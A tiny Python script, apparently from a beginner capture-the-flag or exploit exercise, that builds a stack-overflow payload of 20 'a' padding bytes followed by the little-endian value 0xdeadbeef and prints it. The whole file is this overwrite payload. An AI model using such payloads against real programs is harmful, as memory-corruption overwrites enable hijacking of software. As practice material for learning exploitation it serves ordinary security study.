buf = 'a'*20

payload = bytearray()
payload.extend(buf.encode())
payload.append(239) #ef
payload.append(190) #be
payload.append(173) #ad
payload.append(222) #de
print(bytes(payload))

